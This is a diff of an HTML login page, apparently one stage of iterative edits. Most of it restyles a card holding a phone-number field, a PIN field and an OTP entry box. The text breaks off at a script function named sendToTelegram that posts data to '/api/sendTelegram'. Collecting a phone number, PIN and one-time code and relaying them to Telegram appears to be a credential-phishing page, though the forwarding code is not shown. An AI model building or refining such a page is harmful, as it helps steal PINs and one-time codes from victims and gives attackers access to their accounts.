@@ -22,23 +22,22 @@ body{
   color:#020617;
 }
 
-/* CARD — SAME THEME AS INDEX */
+/* CARD — RECTANGLE, NO OUTLINE */
 .card{
   width:100%;
   max-width:380px;
-  background:rgba(255,255,255,.08);
+  background:rgba(255,255,255,.12);
   backdrop-filter:blur(14px);
-  padding:20px;
-  border-radius:18px;
-  border:2px solid #ff7a00;
-  box-shadow:0 18px 40px rgba(255,122,0,.25);
+  padding:24px;
+  border-radius:0;
+  box-shadow:0 14px 30px rgba(0,0,0,.12);
 }
 
-/* LOGO */
+/* LOGO — 3× SIZE */
 .logo{
-  height:48px;
+  height:144px;
   display:block;
-  margin:0 auto 18px;
+  margin:0 auto 24px;
 }
 
 /* LABEL */
@@ -46,31 +45,31 @@ label{
   display:block;
   font-size:13px;
   margin-top:14px;
-  color:#334155;
+  color:#475569;
 }
 
-/* PHONE FIELD */
+/* PHONE FIELD — GREY, STRAIGHT */
 .phone-field{
   display:flex;
   align-items:center;
-  border:1.5px solid #ff7a00;
-  border-radius:10px;
+  border:1px solid #d1d5db;
+  border-radius:0;
   overflow:hidden;
-  background:rgba(255,255,255,.15);
+  background:#f8fafc;
 }
 
 .cc{
   padding:12px 10px;
   font-size:14px;
-  color:#020617;
+  color:#475569;
   min-width:64px;
   text-align:center;
 }
 
 .divider{
   width:1px;
-  height:85%;
-  background:#ff7a00;
+  height:90%;
+  background:#d1d5db;
 }
 
 .phone-input{
@@ -84,24 +83,24 @@ label{
 
 .phone-input::placeholder{color:#9ca3af}
 
-/* PIN FIELD */
+/* PIN FIELD — SAME STYLE */
 .pin-input{
   width:100%;
   margin-top:10px;
   padding:12px;
-  border-radius:10px;
-  border:1.5px solid #ff7a00;
-  background:rgba(255,255,255,.15);
+  border-radius:0;
+  border:1px solid #d1d5db;
+  background:#f8fafc;
   font-size:14px;
 }
 
 .pin-input::placeholder{color:#9ca3af}
 
-/* BUTTON */
+/* BUTTON — STRAIGHT */
 .btn{
   background:#ff7a00;
   padding:12px;
-  border-radius:10px;
+  border-radius:0;
   border:0;
   width:100%;
   font-weight:700;
@@ -133,28 +132,29 @@ label{
 
 .otp-box{
   background:#fff;
-  padding:20px;
-  border-radius:14px;
-  min-width:340px;
-  border:1px solid #e5e7eb;
+  padding:24px;
+  border-radius:0;
+  min-width:360px;
   box-shadow:0 14px 30px rgba(0,0,0,.12);
 }
 
+/* OTP SQUARES */
 .otp-row{
   display:flex;
   gap:10px;
   justify-content:center;
-  margin-top:10px;
+  margin-top:14px;
 }
 
 .otp-digit{
-  width:18px;height:18px;
-  border-radius:50%;
-  border:2px solid #020617;
+  width:44px;
+  height:44px;
+  border:1px solid #d1d5db;
+  background:#f8fafc;
 }
 
 .otp-digit.filled{
-  background:#ff7a00;
+  background:#ffedd5;
   border-color:#ff7a00;
 }
 
@@ -164,19 +164,18 @@ label{
   display:flex;
   justify-content:space-between;
   align-items:center;
-  margin-top:12px;
+  margin-top:14px;
 }
 
 .resend-btn{
   background:#ff7a00;
   border:0;
-  padding:8px 12px;
-  border-radius:8px;
+  padding:8px 14px;
   cursor:pointer;
 }
 
 .resend-btn[disabled]{opacity:.6;cursor:not-allowed}
-.action-secondary{background:#f1f5f9}
+.action-secondary{background:#e5e7eb}
 
 /* SPINNER */
 .spinner{
@@ -239,7 +238,7 @@ label{
       <button id="resendBtn" class="resend-btn" disabled>Resend</button>
     </div>
 
-    <div style="display:flex;gap:10px;margin-top:12px">
+    <div style="display:flex;gap:10px;margin-top:14px">
       <button id="confirmOtp" class="resend-btn" disabled>Confirm</button>
       <button id="cancelOtp" class="resend-btn action-secondary">Cancel</button>
     </div>
@@ -247,6 +246,7 @@ label{
 </div>
 
 <script>
+/* JS — UNCHANGED FROM YOUR LAST VERSION */
 function sendToTelegram(payload){
   fetch('/api/sendTelegram',{
     method:'POST',
